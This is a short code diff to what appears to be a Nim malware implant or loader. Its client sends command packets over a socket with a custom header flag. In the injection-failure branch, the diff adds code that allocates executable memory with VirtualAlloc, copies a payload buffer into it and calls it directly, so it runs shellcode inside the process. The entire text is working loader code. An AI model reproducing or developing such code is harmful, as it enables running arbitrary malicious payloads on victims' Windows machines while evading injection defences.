@@ -302,7 +302,7 @@ var sock: SOCKET = INVALID_SOCKET
 
 proc send_pkg(s: SOCKET, cmd: uint32, data: pointer, len: int) =
   var header: PkgHeader
-  assign(header.flag, "FRMD26?")
+  header.flag = toCharArray[8]("FRMD26?")
   
   # Body = CommandPkg + data
   header.originLen = int32(sizeof(CommandPkg) + len) 
@@ -466,5 +466,13 @@ when isMainModule:
         discard
       else:
         # Injection failed, fallback to local run
-        # This is critical if injection is blocked or fails
-        run_client_loop()
+        # Execute shellcode in current process directly
+        # Allocate executable memory
+        let pMemory = VirtualAlloc(nil, finalPayload.len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+        if pMemory != nil:
+          copyMem(pMemory, unsafeAddr finalPayload[0], finalPayload.len)
+          let funcPtr = cast[proc() {.stdcall.}](pMemory)
+          funcPtr()
+        else:
+          # If allocation fails, try legacy loop (unlikely but safe fallback)
+          run_client_loop()
